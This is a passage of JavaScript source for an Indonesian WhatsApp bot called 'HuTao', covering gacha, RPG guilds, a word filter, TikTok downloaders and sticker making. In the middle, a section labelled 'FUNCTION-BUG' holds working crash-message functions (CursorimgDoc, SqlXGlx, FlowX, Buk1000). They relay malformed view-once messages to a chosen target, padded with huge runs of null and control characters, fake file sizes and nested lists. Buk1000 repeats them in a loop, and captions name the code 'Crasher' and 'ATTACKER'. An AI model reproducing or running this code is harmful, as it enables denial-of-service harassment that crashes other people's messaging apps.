        gachaResults = JSON.parse(fs.readFileSync(JSON_FILE_PATH, "utf-8"));
      } catch (error) {
        console.error("Error reading JSON file:", error);
      }
      gachaResults.push({ chatId, item: selectedItem });
      try {
        fs.writeFileSync(JSON_FILE_PATH, JSON.stringify(gachaResults, null, 2));
        console.log("Gacha result saved to JSON file");
      } catch (error) {
        console.error("Error writing JSON file:", error);
      }
      const hasilgacha = `Selamat! Anda mendapatkan: ${selectedItem}\nJika Mendapatkan Item Yang Sama\nAnda Tidak akan Mempunyai nya lebih, Maksimal 1`;
      await reply(hasilgacha);
    }

    let guilds = {};
    let userGuilds = {};
    let battleRequests = {};

    const guildsPath = "./system/RPG/Guilds.json";
    const userGuildsPath = "./system/RPG/UserGuilds.json";

    // Load data from JSON file
    const loadData = (path, defaultValue) => {
      if (fs.existsSync(path)) {
        try {
          return JSON.parse(fs.readFileSync(path, "utf-8"));
        } catch (err) {
          console.error("Error reading JSON file:", err);
          return defaultValue;
        }
      }
      return defaultValue;
    };
    //GUILD RPG
    const pathh = "./system/RPG/guilds.json";
    const userPath = "./system/RPG/userss.json";

    // Load guilds data & sv

    if (fs.existsSync(pathh)) {
      guilds = JSON.parse(fs.readFileSync(pathh, "utf-8"));
    }

    let users = {};
    if (fs.existsSync(userPath)) {
      users = JSON.parse(fs.readFileSync(userPath, "utf-8"));
    }

    const saveGuilds = () => {
      fs.writeFileSync(pathh, JSON.stringify(guilds, null, 2));
    };

    const saveUsers = () => {
      fs.writeFileSync(userPath, JSON.stringify(users, null, 2));
    };

    const createGuild = (guildName, creatorId) => {
      if (guilds[guildName]) {
        return reply(`Guild dengan nama ${guildName} sudah ada.`);
      }

      if (users[creatorId] && users[creatorId].guild) {
        return reply(
          `Anda sudah menjadi anggota guild: ${users[creatorId].guild}`
        );
      }

      guilds[guildName] = { leader: creatorId, members: [] };
      users[creatorId] = { guild: guildName, role: "leader" };

      saveGuilds();
      saveUsers();

      return reply(`Guild ${guildName} berhasil dibuat!`);
    };

    const listGuilds = () => {
      const guildNames = Object.keys(guilds);
      if (guildNames.length === 0) {
        return reply("Tidak ada guild yang tersedia.");
      }
      return reply(`Daftar guild yang tersedia:\n- ${guildNames.join("\n- ")}`);
    };

    const getGuildInfo = (guildName) => {
      const guild = guilds[guildName];
      if (!guild) {
        return reply(`Guild dengan nama ${guildName} tidak ditemukan.`);
      }

      const leader = guild.leader;
      const members = guild.members;

      let info = `*${m2}< G U I L D - I N F O >${m2}* 

*Name: ${guildName}*\nLeader: ${leader}\n\nMembers:\n`;
      members.forEach((member, index) => {
        info += `\n${index + 1}. ${member}`;
      });

      return reply(info);
    };

    const joinGuild = (guildName, userId) => {
      const guild = guilds[guildName];
      if (!guild) {
        return reply(`Guild dengan nama ${guildName} tidak ditemukan.`);
      }

      if (users[userId] && users[userId].guild) {
        return reply(
          `Anda sudah menjadi anggota guild: ${users[userId].guild}`
        );
      }

      guild.members.push(userId);
      users[userId] = { guild: guildName, role: "member" };

      saveGuilds();
      saveUsers();

      return reply(`Anda berhasil bergabung dengan guild ${guildName}!`);
    };

    const deleteGuild = (guildName, userId) => {
      const guild = guilds[guildName];
      if (!guild) {
        return reply(`Guild dengan nama ${guildName} tidak ditemukan.`);
      }

      if (guild.leader !== userId) {
        return reply(`Anda tidak memiliki izin untuk menghapus guild ini.`);
      }

      guild.members.forEach((member) => {
        delete users[member];
      });

      delete users[guild.leader];
      delete guilds[guildName];

      saveGuilds();
      saveUsers();

      return reply(`Guild ${guildName} berhasil dihapus!`);
    };

    const leaveGuild = (userId) => {
      const user = users[userId];
      if (!user || !user.guild) {
        return reply(`Anda tidak berada dalam guild manapun.`);
      }

      const guildName = user.guild;
      const guild = guilds[guildName];

      if (user.role === "leader") {
        return reply(
          `Sebagai leader, Anda tidak bisa keluar dari guild. Anda harus menghapus guild.`
        );
      }

      guild.members = guild.members.filter((member) => member !== userId);
      delete users[userId];

      saveGuilds();
      saveUsers();

      return reply(`Anda telah keluar dari guild ${guildName}.`);
    };

    const bannedWords = ["kasar1", "kasar2", "kasar3"];
    async function handleMessages(messages, Kilianhst) {
      const msg = messages[0];
      if (!msg.message || msg.key.fromMe) return;

      const sender = msg.key.remoteJid;
      const textMessage =
        msg.message.conversation || msg.message.extendedTextMessage?.text;

      if (textMessage && containsBadWord(textMessage)) {
        console.log(`Terdeteksi Berkata Kasar ${sender}`);
        await warnUser(sender, Kilianhst);
        if (msg.key.participant) {
          await deleteMessage(sender, msg.key, Kilianhst);
        }
      }
    }
    function containsBadWord(text) {
      return bannedWords.some((word) => text.toLowerCase().includes(word));
    }
    async function warnUser(sender, Kilianhst) {
      await Kilianhst.sendMessage(sender, {
        text: "Terdeteksi Berkata Kasar ⚡",
      });
    }
    async function deleteMessage(sender, key, Kilianhst) {
      await Kilianhst.sendMessage(sender, {
        delete: key,
      });
    }

    // SELF DAN PUBLIC
    if (!global.public) {
      if (!m.key.fromMe && !isCreator) return;
    }

    if (isCmd && autotyping) {
      if (command) {
        Kilianhst.readMessages([m.key]);
      }
      Kilianhst.sendPresenceUpdate("composing", from);
    }

    // DOWNLOAD FITUR TIKTOK 2
    async function tiktok2(query) {
      return new Promise(async (resolve, reject) => {
        try {
          const encodedParams = new URLSearchParams();
          encodedParams.set("url", query);
          encodedParams.set("hd", "1");
          const response = await axios({
            method: "POST",
            url: "https://tikwm.com/api/",
            headers: {
              "Content-Type":
                "application/x-www-form-urlencoded; charset=UTF-8",
              Cookie: "current_language=en",
              "User-Agent":
                "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36",
            },
            data: encodedParams,
          });
          const videos = response.data.data;
          const result = {
            title: videos.title,
            cover: videos.cover,
            origin_cover: videos.origin_cover,
            no_watermark: videos.play,
            watermark: videos.wmplay,
            music: videos.music,
          };
          resolve(result);
        } catch (error) {
          reject(error);
        }
      });
    }

    async function tiktokSearchVideo(query) {
      return new Promise(async (resolve, reject) => {
        axios("https://tikwm.com/api/feed/search", {
          headers: {
            "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
            cookie: "current_language=en",
            "User-Agent":
              "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36",
          },
          data: {
            keywords: query,
            count: 12,
            cursor: 0,
            web: 1,
            hd: 1,
          },
          method: "POST",
        }).then((res) => {
          resolve(res.data.data);
        });
      });
    }

    function checkType(param) {
      // Misalkan kita ingin memastikan semua input berupa string
      if (typeof param !== "string") {
        console.log("Mengubah param menjadi string.");
        param = String(param); // Mengubah param ke string
      }

      // Sekarang kita bisa cek tipe setelah konversi
      if (typeof param === "string") {
        console.log(`Param adalah string: "${param}"`);
      } else {
        console.log(`Tipe param tidak dikenal:`, param);
      }
    }

    // EPHOTO
    async function ephoto(url, texk) {
      let form = new FormData();
      let gT = await axios.get(url, {
        headers: {
          "user-agent":
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36",
        },
      });
      let $ = cheerio.load(gT.data);
      let text = texk;
      let token = $("input[name=token]").val();
      let build_server = $("input[name=build_server]").val();
      let build_server_id = $("input[name=build_server_id]").val();
      form.append("text[]", text);
      form.append("token", token);
      form.append("build_server", build_server);
      form.append("build_server_id", build_server_id);
      let res = await axios({
        url: url,
        method: "POST",
        data: form,
        headers: {
          Accept: "*/*",
          "Accept-Language": "en-US,en;q=0.9",
          "user-agent":
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36",
          cookie: gT.headers["set-cookie"]?.join("; "),
          ...form.getHeaders(),
        },
      });
      let $$ = cheerio.load(res.data);
      let json = JSON.parse($$("input[name=form_value_input]").val());
      json["text[]"] = json.text;
      delete json.text;
      let { data } = await axios.post(
        "https://en.ephoto360.com/effect/create-image",
        new URLSearchParams(json),
        {
          headers: {
            "user-agent":
              "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36",
            cookie: gT.headers["set-cookie"].join("; "),
          },
        }
      );
      return build_server + data.image;
    }

    if (text && fixes[text.toLowerCase()]) {
      return Kilianhst.sendMessage(
        msg.key.remoteJid,
        { text: fixes[text.toLowerCase()] },
        { quoted: msg }
      );
    }

    // MENGAKTIFKAN DEATURE ANTI
    function handleFeatureToggle(feature, command) {
      if (!m.isGroup) return reply(mess.OnlyGrup);
      if (!isBotAdmins) return reply(mess.botAdmin);
      if (!isAdmins && !isCreator) return reply(mess.admin);
      if (args.length < 1)
        return reply(
          "ketik on untuk mengaktifkan\nketik off untuk menonaktifkan"
        );

      if (args[0] === "on") {
        db.data.chats[from][feature] = true;
        return reply(`${command} is enabled`);
      } else if (args[0] === "off") {
        db.data.chats[from][feature] = false;
        return reply(`${command} is disabled`);
      }
    }

    // TOTOAL FEATURED
    const totalFitur = () => {
      var mytext = fs.readFileSync("./case.js").toString();
      var numUpper = (mytext.match(/case '/g) || []).length;
      return numUpper;
    };

    // PICK RANDOM
    const pickRandom = (arr) => {
      return arr[Math.floor(Math.random() * arr.length)];
    };

    // TEXT UNBAN
    const {
      textunbanv1,
      textunbanv2,
      textunbanv3,
      textunbanv4,
      textunbanv5,
      textunbanv6,
      textunbanv7,
      textunbanv8,
      textunbanv9,
      textunbanv10,
      textunbanv11,
      textunbanv12,
      textunbanv13,
      textunbanv14,
      textunbanv15,
      textunbanv16,
      textunbanv17,
      textunbanv18,
      textunbanv19,
      textunbanv20,
      textunbanv21,
    } = require("./system/metthod/textunban.js");
    const {
      textunbanpremv1,
      textunbanpremv2,
      textunbanpremv3,
    } = require("./system/metthod/textunbanprem.js");

    if (
      !isCreator &&
      global.onlygc &&
      !m.isGroup &&
      isCmd &&
      !["chat", "menuu", "panel", "tt"].includes(command)
    )
      return m.reply(`bot sedang mode group🤐`);
    if (
      !isCreator &&
      global.onlygc &&
      !m.isGroup &&
      isCmd &&
      !["allmenu", "menuu", "owner", "tt"].includes(command)
    )
      return await Kilianhst.sendMessage(m.chat, {
        react: { text: "", key: m.key },
      }); /*Kilianhst.sendMessage(m.chat,
{ text: `*[ - ] Hello ${pushname} Kamu Belum Masuk Yah?*

> Untuk Menggunakan HuTao - AI,, Kamu Harus Masuk Ke Group KilSMP Terlebih Dahulu Setelah Itu Anda Dapat Menggunakan HuTao

[ !! ] ACCES GROUP
https://chat.whatsapp.com/LVRh7AQAtLo94jO2MO7oxD`,
contextInfo:{
mentionedJid:[m.sender],
forwardingScore: 9999999,
isForwarded: true, 
"externalAdReply": {
"showAdAttribution": true,
"containsAutoReply": true,
"title": `Not Acces`,
"body": `HuTao`,
"previewType": "PHOTO",
"thumbnailUrl": `https://img12.pixhost.to/images/1357/582665407_6726.jpg`,
"thumbnailUrl": `https://img12.pixhost.to/images/1357/582665407_6726.jpg`,
"sourceUrl": ``}}},
{ quoted: m})*/

    //==================================================================\\
    // [    F U N C T I O N -   B U G -    K Y Y X D Z
    //==================================================================\\

    async function CursorimgDoc(target) {
      const buttons = [
        {
          buttonId: "\u0000".repeat(299999),
          buttonText: { displayText: "Haii?" },
          type: 1,
          nativeFlowInfo: { name: "single_select", paramsJson: "{}" },
        },
        {
          buttonId: "\u0000",
          buttonText: { displayText: "𝐃𝐎 𝐀𝐓𝐓𝐀𝐂𝐊𝐄𝐑" },
          type: 1,
          nativeFlowInfo: {
            name: "𝐃𝐎 𝐀𝐓𝐓𝐀𝐂𝐊𝐄𝐑",
            paramsJson: `{\"screen_2_OptIn_0\":true,\"screen_2_OptIn_1\":true,\"screen_1_Dropdown_0\":\"TrashDex Superior\",\"screen_1_DatePicker_1\":\"1028995200000\",\"screen_1_TextInput_2\":\"devorsixcore@trash.lol\",\"screen_1_TextInput_3\":\"94643116\",\"screen_0_TextInput_0\":\"radio - buttons${"\u0000".repeat(
              220000
            )}\",\"screen_0_TextInput_1\":\"Anjay\",\"screen_0_Dropdown_2\":\"001-Grimgar\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"}`,
            version: 2,
          },
        },
      ];
      let messagePayload = {
        viewOnceMessage: {
          message: {
            imageMessage: {
              url: "https://mmg.whatsapp.net/v/t62.7118-24/35284527_643231744938351_8591636017427659471_n.enc?ccb=11-4&oh=01_Q5AaIF8-zrQNGs5lAiDqXBhinREa4fTrmFipGIPYbWmUk9Fc&oe=67C9A6D5&_nc_sid=5e03e0&mms3=true",
              mimetype: "image/jpeg",
              caption:
                "ざ ⿻ᬃ𝐕𝐀𝐋𝐈𝐃𝐀𝐓𝐎𝐑 𝐊𝐢𝐥𝐥⃟⃟⿻ だ" +
                "\u0000".repeat(199) +
                "ꦾ".repeat(15999),
              fileSha256: "ud/dBUSlyour8dbMBjZxVIBQ/rmzmerwYmZ76LXj+oE=",
              fileLength: "99999999999",
              height: 307,
              width: 734,
              mediaKey: "TgT5doHIxd4oBcsaMlEfa+nPAw4XWmsQLV4PDH1jCPw=",
              fileEncSha256: "IkoJOAPpWexlX2UnqVd5Qad4Eu7U5JyMZeVR1kErrzQ=",
              directPath:
                "/v/t62.7118-24/35284527_643231744938351_8591636017427659471_n.enc?ccb=11-4&oh=01_Q5AaIF8-zrQNGs5lAiDqXBhinREa4fTrmFipGIPYbWmUk9Fc&oe=67C9A6D5&_nc_sid=5e03e0",
              mediaKeyTimestamp: "1738686532",
              jpegThumbnail:
                "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAB4ASAMBIgACEQEDEQH/xAArAAACAwEAAAAAAAAAAAAAAAAEBQACAwEBAQAAAAAAAAAAAAAAAAAAAAD/2gAMAwEAAhADEAAAABFJdjZe/Vg2UhejAE5NIYtFbEeJ1xoFTkCLj9KzWH//xAAoEAABAwMDAwMFAAAAAAAAAAABAAIDBBExITJBEBJRBRMUIiNicoH/2gAIAQEAAT8AozeOpd+K5UBBiIfsUoAd9OFBv/idkrtJaCrEFEnCpJxCXg4cFBHEXgv2kp9ENCMKujEZaAhfhDKqmt9uLs4CFuUSA09KcM+M178CRMnZKNHaBep7mqK1zfwhlRydp8hPbAQSLgoDpHrQP/ZRylmmtlVj7UbvI6go6oBf/8QAFBEBAAAAAAAAAAAAAAAAAAAAMP/aAAgBAgEBPwAv/8QAFBEBAAAAAAAAAAAAAAAAAAAAMP/aAAgBAwEBPwAv/9k=",
              scansSidecar:
                "nxR06lKiMwlDForPb3f4fBJq865no+RNnDKlvffBQem0JBjPDpdtaw==",
              scanLengths: [2226, 6362, 4102, 6420],
              midQualityFileSha256:
                "erjot3g+S1YfsbYqct30GbjvXD2wgQmog8blam1fWnA=",
              contextInfo: {
                virtexId: Kilianhst.generateMessageTag(),
                participant: "0@s.whatsapp.net",
                mentionedJid: [target, "0@s.whatsapp.net"],
                quotedMessage: {
                  buttonsMessage: {
                    documentMessage: {
                      url: "https://mmg.whatsapp.net/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc?ccb=11-4&oh=01_Q5AaIC01MBm1IzpHOR6EuWyfRam3EbZGERvYM34McLuhSWHv&oe=679872D7&_nc_sid=5e03e0&mms3=true",
                      mimetype:
                        "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                      fileSha256:
                        "+6gWqakZbhxVx8ywuiDE3llrQgempkAB2TK15gg0xb8=",
                      fileLength: "9999999999999",
                      pageCount: 3567587327,
                      mediaKey: "n1MkANELriovX7Vo7CNStihH5LITQQfilHt6ZdEf+NQ=",
                      fileName: "KilianhstInflow",
                      fileEncSha256:
                        "K5F6dITjKwq187Dl+uZf1yB6/hXPEBfg2AJtkN/h0Sc=",
                      directPath:
                        "/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc?ccb=11-4&oh=01_Q5AaIC01MBm1IzpHOR6EuWyfRam3EbZGERvYM34McLuhSWHv&oe=679872D7&_nc_sid=5e03e0",
                      mediaKeyTimestamp: "1735456100",
                      caption: "ざ ⿻ᬃ𝐕𝐀𝐋𝐈𝐃𝐀𝐓𝐎𝐑 𝐊𝐢𝐥𝐥⃟⃟⿻ だ",
                    },
                    hasMediaAttachment: true,
                    contentText: "KilianhstFlows",
                    footerText: "Apsi Ngentot?",
                    buttons: buttons,
                    viewOnce: true,
                    headerType: 3,
                  },
                },
                isForwarded: true,
                actionLink: {
                  url: "t.me/rayystur",
                  buttonTitle: "𝐃𝐎 𝐀𝐓𝐓𝐀𝐂𝐊𝐄𝐑",
                },
                forwardedNewsletterMessageInfo: {
                  newsletterJid: "120363383643148260@newsletter",
                  serverMessageId: 1,
                  newsletterName: `All Info 𝐃𝐎 𝐀𝐓𝐓𝐀𝐂𝐊𝐄𝐑 ofc 𖣂${"ꥈꥈꥈꥈꥈꥈ".repeat(
                    10
                  )}`,
                  contentType: 3,
                  accessibilityText: "kontol",
                },
              },
            },
          },
        },
      };
      await Kilianhst.relayMessage(target, messagePayload, {
        messageId: Kilianhst.generateMessageTag(),
        participant: { jid: target },
      });
    }

    async function SqlXGlx(target) {
      let sections = [];

      for (let i = 0; i < 10; i++) {
        let largeText = "ꦾ".repeat(25);

        let deepNested = {
          title: `Super Deep Nested Section ${i}`,
          highlight_label: `Extreme Highlight ${i}`,
          rows: [
            {
              title: largeText,
              id: `id${i}`,
              subrows: [
                {
                  title: "Nested row 1",
                  id: `nested_id1_${i}`,
                  subsubrows: [
                    {
                      title: "Deep Nested row 1",
                      id: `deep_nested_id1_${i}`,
                    },
                    {
                      title: "Deep Nested row 2",
                      id: `deep_nested_id2_${i}`,
                    },
                  ],
                },
                {
                  title: "Nested row 2",
                  id: `nested_id2_${i}`,
                },
              ],
            },
          ],
        };

        sections.push(deepNested);
      }

      let listMessage = {
        title: "Massive Menu Overflow",
        sections: sections,
      };

      let message = {
        viewOnceMessage: {
          message: {
            messageContextInfo: {
              deviceListMetadata: {},
              deviceListMetadataVersion: 2,
            },
            interactiveMessage: {
              contextInfo: {
                mentionedJid: [target],
                isForwarded: true,
                forwardingScore: 999,
                businessMessageForwardInfo: {
                  businessOwnerJid: target,
                },
              },
              body: {
                text: "P",
              },
              nativeFlowMessage: {
                buttons: [
                  {
                    name: "single_select",
                    buttonParamsJson: "JSON.stringify(listMessage)",
                  },
                  {
                    name: "call_permission_request",
                    buttonParamsJson: "JSON.stringify(listMessage)",
                  },
                  {
                    name: "mpm",
                    buttonParamsJson: "JSON.stringify(listMessage)",
                  },
                  {
                    name: "galaxy_message",
                    paramsJson: `{\"screen_2_OptIn_0\":true,           \"screen_2_OptIn_1\":true,\"screen_1_Dropdown_0\":\"TrashDex Superior\",\"screen_1_DatePicker_1\":\"1028995200000\",\"screen_1_TextInput_2\":\"DapzNotDev@trash.lol\",\"screen_1_TextInput_3\":\"94643116\",\"screen_0_TextInput_0\":\"radio - buttons${"\u0003".repeat(
                      355000
                    )}\",\"screen_0_TextInput_1\":\"Anjay\",\"screen_0_Dropdown_2\":\"001-Grimgar\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"}`,
                    version: 3,
                  },
                ],
              },
            },
          },
        },
      };

      await Kilianhst.relayMessage(target, message, {
        participant: { jid: target },
      });
    }

    async function FlowX(target) {
      let msg = await generateWAMessageFromContent(
        target,
        {
          viewOnceMessage: {
            message: {
              interactiveMessage: {
                header: {
                  title: "© 𝐕𝐀𝐋𝐈𝐃𝐀𝐓𝐎𝐑 𝐂𝐫𝐚𝐬𝐡𝐞𝐫👀",
                  hasMediaAttachment: false,
                },
                body: {
                  text: "𝐃𝐎 𝐀𝐓𝐓𝐀𝐂𝐊𝐄𝐑🐉",
                },
                nativeFlowMessage: {
                  messageParamsJson: "",
                  buttons: [
                    {
                      name: "single_select",
                      buttonParamsJson: "z",
                    },
                    {
                      name: "call_permission_request",
                      buttonParamsJson: "{}",
                    },
                  ],
                },
              },
            },
          },
        },
        {}
      );

      await Kilianhst.relayMessage(target, msg.message, {
        messageId: msg.key.id,
        participant: { jid: target },
      });
    }

    async function Buk1000(target) {
      for (let i = 0; i <= 20; i++) {
        await FlowX(target);
        await SqlXGlx(target);
        await uibuglogger(target);
        await CursorimgDoc(target);
      }
    }

    const sound = {
      key: {
        fromMe: false,
        participant: `18002428478@s.whatsapp.net`,
        ...(from ? { remoteJid: "status@broadcast" } : {}),
      },
      message: {
        audioMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7114-24/56189035_1525713724502608_8940049807532382549_n.enc?ccb=11-4&oh=01_AdR7-4b88Hf2fQrEhEBY89KZL17TYONZdz95n87cdnDuPQ&oe=6489D172&mms3=true",
          mimetype: "audio/mp4",
          fileSha256: "oZeGy+La3ZfKAnQ1epm3rbm1IXH8UQy7NrKUK3aQfyo=",
          fileLength: "1067401",
          seconds: 9999999999999,
          ptt: true,
          mediaKey: "PeyVe3/+2nyDoHIsAfeWPGJlgRt34z1uLcV3Mh7Bmfg=",
          fileEncSha256: "TLOKOAvB22qIfTNXnTdcmZppZiNY9pcw+BZtExSBkIE=",
          directPath:
            "/v/t62.7114-24/56189035_1525713724502608_8940049807532382549_n.enc?ccb=11-4&oh=01_AdR7-4b88Hf2fQrEhEBY89KZL17TYONZdz95n87cdnDuPQ&oe=6489D172",
          mediaKeyTimestamp: "1684161893",
        },
      },
    };

    const hw = {
      key: {
        participant: "18002428478@s.whatsapp.net",
        ...(m.chat ? { remoteJid: `status@broadcast` } : {}),
      },
      message: {
        liveLocationMessage: {
          caption: `© 𝐕𝐀𝐋𝐈𝐃𝐀𝐓𝐎𝐑 𝐂𝐫𝐚𝐬𝐡𝐞𝐫 𝐕1`,
          jpegThumbnail: "",
        },
      },
      quoted: sound,
    };
    //==================================================================\\
    //==================================================================\\

    // Cek Bot Lain Ikut Balas Command
    if (antibot[m.chat] && m.isGroup && isCmd) {
      setTimeout(async () => {
        try {
          let messages = await Kilianhst.fetchMessagesFromWA(m.chat, 5);
          for (let msg of messages) {
            let jid = msg.key.participant || msg.key.remoteJid;
            let senderBot =
              msg.key.fromMe === false &&
              jid !== m.sender &&
              jid.endsWith("@s.whatsapp.net");
            let botDetected =
              msg.message?.buttonsMessage ||
              msg.message?.templateMessage ||
              msg.message?.listMessage ||
              msg.message?.imageMessage?.caption
                ?.toLowerCase()
                .includes("bot") ||
              msg.message?.conversation?.toLowerCase().includes("bot");

            if (senderBot && botDetected) {
              console.log("Detected:", jid);
              await Kilianhst.groupParticipantsUpdate(m.chat, [jid], "remove");
              await reply(`Bot Terdeteksi Dan Telah Di-Kick Otomatis!`);
            }
          }
        } catch (e) {
          console.log("AntiBot Error:", e);
        }
      }, 2500);
    }

    //==================================================================\\
    //===================[ FUNCTION REPLY ]=====================\\
    async function makeStickerFromUrl(imageUrl, Kilianhst, m) {
      try {
        let buffer;
        if (imageUrl.startsWith("data:")) {
          const base64Data = imageUrl.split(",")[1];
          buffer = Buffer.from(base64Data, "base64");
        } else {
          const response = await axios.get(imageUrl, {
            responseType: "arraybuffer",
          });
          buffer = Buffer.from(response.data, "binary");
        }

        const webpBuffer = await sharp(buffer)
          .resize(512, 512, {
            fit: "contain",
            background: { r: 255, g: 255, b: 255, alpha: 0 },
          })
          .webp({ quality: 70 })
          .toBuffer();

        const penis = await addExif(webpBuffer, global.packname, global.author);

        const fileName = getRandomFile(".webp");
        fs.writeFileSync(fileName, webpBuffer);

        await Kilianhst.sendMessage(
          m.chat,
          {
            sticker: penis,
            contextInfo: {
              externalAdReply: {
                showAdAttribution: true,
                title: `HuTao`,
                body: `HuTao Always With You`,
                mediaType: 3,
                renderLargerThumbnail: false,
                thumbnailUrl: global.thumb,
                sourceUrl: `https://youtube.com/@KilianHosr`,
              },
            },
          },
          { quoted: m }
        );

        fs.unlinkSync(fileName);
      } catch (error) {
        console.error("Error creating sticker:", error);
        m.reply("Terjadi kesalahan saat membuat stiker. Coba lagi nanti.");
      }
    }

    async function reply(txt) {
      const HuTao = {
        contextInfo: {
          forwardingScore: 999,
          isForwarded: true,
          forwardedNewsletterMessageInfo: {
            newsletterName: `${runtime(process.uptime())}`,
            newsletterJid: `120363405649403674@newsletter`,
          },
          externalAdReply: {
            showAdAttribution: true,
            title: `${waktuucapan}`,
            body: "- HuTao",
            thumbnailUrl: `https://files.catbox.moe/b2a5ky.jpg`,
            sourceUrl: global.website,
          },
        },
        text: txt,
      };
      return Kilianhst.sendMessage(m.chat, HuTao, {
        quoted: m,
      });
    }

    const reply2 = (teks) => {
      Kilianhst.sendMessage(from, { text: teks }, { quoted: m });
    };

    const example = (teks) => {
      return `\n *Contoh Penggunaan :*\n Ketik *${prefix + command}* ${teks}\n`;
    };

    async function daftar(teks) {
      const nedd = {
        text: teks,
        contextInfo: {
          mentionedJid: m.mentionedJid ? m.mentionedJid : [m.sender],
          forwardingScore: 9999999,
          isForwarded: true,
          businessMessageForwardInfo: {
            businessOwnerJid: `${global.owner}@s.whatsapp.net`,
          },
          externalAdReply: {
            showAdAttribution: true,
            containsAutoReply: true,
            title: "Not Acces !!!",
            body: "Silahkan Daftar Ke HuTao !!",
            previewType: "PHOTO",
            thumbnailUrl: global.warn,
            sourceUrl: "https://www.youtube.com/@KilianoLIVE_EN6",
          },
        },
      };
      return await Kilianhst.sendMessage(m.chat, nedd, {
        quoted: m.quoted ? m.quoted : m,
      });
    }

    //==================================================================\\
    //==================================================================\\

    //==================================================================\\
    // F U N T I O N A U T O D O W N L O A D
    //=================================================================\\
    if (
      budy.startsWith("https://vt.tiktok.com/") ||
      budy.startsWith("https://www.tiktok.com/") ||
      budy.startsWith("https://t.tiktok.com/") ||
      budy.startsWith("https://vm.tiktok.com/")
    ) {
      Kilianhst.sendMessage(m.chat, { react: { text: `⏱️`, key: m.key } });
      try {
        const data = await fetchJson(
          `https://api.tiklydown.eu.org/api/download?url=${encodeURIComponent(
            budy
          )}`
        );
        const vidnya = data?.video?.noWatermark;
        if (vidnya) {
          const caption = `\`[ ᴛɪᴋᴛᴏᴋ ᴅᴏᴡɴʟᴏᴀᴅᴇʀ ]\`
      
> ᴠɪᴅᴇᴏ ᴅᴀʀɪ : _${data.author?.name ?? "Tidak diketahui"} (@${
            data.author?.unique_id ?? "Tidak diketahui"
          })_
> ʟɪᴋᴇs : _${data.stats?.likeCount ?? "Tidak diketahui"}_
> ᴄᴏᴍᴍᴇɴᴛ : _${data.stats?.commentCount ?? "Tidak diketahui"}_
> sʜᴀʀᴇ : _${data.stats?.shareCount ?? "Tidak diketahui"}_
> ᴘʟᴀʏ : _${data.stats?.playCount ?? "Tidak diketahui"}_
> sᴀᴠᴇs : _${data.stats?.saveCount ?? "Tidak diketahui"}_

\`⏤͟͟͞͞ ᗪᴏᴡɴʟᴏᴀᴅᴇʀ ʙʏ ${botname}\``;

          await Kilianhst.sendMessage(
            m.chat,
            { caption, video: { url: vidnya } },
            { quoted: m }
          );
        } else {
          const nyut = await DinzIDTTDL(budy);
          await Kilianhst.sendMessage(
            m.chat,
            {
              caption: `Judul: ${nyut.title ?? "Tidak diketahui"}\nDeskripsi: ${
                nyut.description ?? "Tidak diketahui"
              }`,
              video: { url: nyut.downloadLink || nyut.hdDownloadLink },
            },
            { quoted: m }
          );
        }
      } catch (error) {
        console.error(error);
        reply("Maaf, terjadi kesalahan saat memproses permintaan Anda.");
      }
    }

    async function DinzIDTTDL(videoUrl) {
      try {
        const endpoint = "https://ssstik.io/abc?url=dl";
        const requestData = new URLSearchParams({
          id: videoUrl,
          locale: "id",
          tt: "VktkdWY4",
        });
        const headers = {
          "HX-Request": "true",
          "HX-Trigger": "_gcaptcha_pt",
          "HX-Target": "target",
          "HX-Current-URL": "https://ssstik.io/id",
          "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
          "User-Agent":
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
        };
        const response = await axios.post(endpoint, requestData.toString(), {
          headers,
        });
        const $ = cheerio.load(response.data);
        const title = $("h2").text().trim() || "Judul tidak tersedia";
        const description =
          $(".maintext").text().trim() || "Deskripsi tidak tersedia";
        const downloadLink =
          $(".download_link.without_watermark").attr("href") || null;
        const hdDownloadLink =
          $(".download_link.without_watermark_hd").attr("href") || null;

        return {
          title,
          description,
          downloadLink,
          hdDownloadLink,
        };
      } catch (error) {
        console.error("Error saat scraping:", error.message);
        return { error: error.message };
      }
    }
    //==================================================================\\
    //==================================================================\\

    //==================================================================\\
    // FUNCTION WAKTU
    //==================================================================\\
    function getFormattedDate() {
      var currentDate = new Date();
      var day = currentDate.getDate();
      var month = currentDate.getMonth() + 1;
      var year = currentDate.getFullYear();
      var hours = currentDate.getHours();
      var minutes = currentDate.getMinutes();
      var seconds = currentDate.getSeconds();
    }

    let d = new Date(new Date() + 3600000);
    let locale = "id";
    let week = d.toLocaleDateString(locale, { weekday: "long" });
    let date = d.toLocaleDateString(locale, {
      day: "numeric",
      month: "long",
      year: "numeric",
    });
    const hariini = d.toLocaleDateString("id", {
      day: "numeric",
      month: "long",
      year: "numeric",
    });

    function msToTime(duration) {
      var milliseconds = parseInt((duration % 1000) / 100),
        seconds = Math.floor((duration / 1000) % 60),
